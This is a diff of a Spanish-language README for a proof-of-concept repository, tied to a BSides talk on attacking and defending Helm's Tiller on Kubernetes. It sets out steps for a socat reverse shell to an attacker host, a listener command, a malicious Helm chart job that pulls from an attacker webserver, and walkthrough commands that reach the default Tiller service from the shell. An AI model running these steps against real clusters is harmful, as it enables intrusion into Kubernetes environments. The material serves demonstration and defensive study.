@@ -2,7 +2,7 @@
 
 Este repositorio contiene los recursos necesarios para desplegar pruebas de concepto utilizando Tiller como vector/target de ataque.
 
-* [Bsides talk](https://www.youtube.com/watch?v=Ax7wMuxwMuY&t=20400)
+* [Talk](https://www.youtube.com/watch?v=Ax7wMuxwMuY&t=20400)
 * [Slides](https://bsidescordoba.org/slides/Preventing_attacks_to_Helm_on_K8s.pdf)
 
 ## Getting Started
@@ -11,10 +11,10 @@ El *startpoint* es una aplicación previamente vulnerada. Para simular el caso, 
 
 ### Prerequisites
 
-* Editar el archivo `/app/socat-shell.sh` indicando *address:port[1]* del atacante en el campo `tcp`.
-* Utilizar como *build context* el folder `/app`. Pullear la imagen obtenida a DockerHub.
-* Editar el archivo `/app/pod.yaml` indicando *repository/image:tag* en el campo `image`.
-* Iniciar un *listener* en el host atacante, utilizando un *port[1]* válido:
+* Editar el archivo `/app/socat-shell.sh` indicando *address:port* del atacante en el campo `tcp`.
+* Utilizar como *build context* el folder `/app`. Pushear la imagen obtenida a DockerHub.
+* Editar el archivo `/app/pod.yaml` indicando *repository/image:tag* correspondiente en el campo `image`.
+* Iniciar un *listener* en el host atacante, utilizando el valor *port* declarado en `/app/socat-shell.sh`:
 
 ```sh
 socat file:`tty`,raw,echo=0 tcp-listen:port
@@ -25,15 +25,13 @@ socat file:`tty`,raw,echo=0 tcp-listen:port
 * Editar el archivo `/templates/job.yaml` indicando *URL* del webserver del atacante en el campo `command`.
 * Crear y publicar un *chart* de Helm utilizando los manifiestos incluídos en el folder `/templates`.
 
-[1]: samevalue
-
 ### Walkthrough
 
 Desde el *reverse-shell*, ejecutar los siguientes comandos:
 
 ```sh
 export HELM_HOME=$(pwd)/helmhome
-export HELM_HOST=tiller-deploy.kube-system.svc.cluster.local:44134 #Default tiller svc
+export HELM_HOST=tiller-deploy.kube-system.svc.cluster.local:44134 #Default `tiller.svc`
 export VER=v2.10.0 #Indica versión de Helm
 curl -L "https://storage.googleapis.com/kubernetes-helm/helm-${VER}-linux-amd64.tar.gz" | tar xz --strip-components=1 -C . linux-amd64/helm #Descarga binario de Helm
 ./helm init --client-only #Inicia client-side de Helm
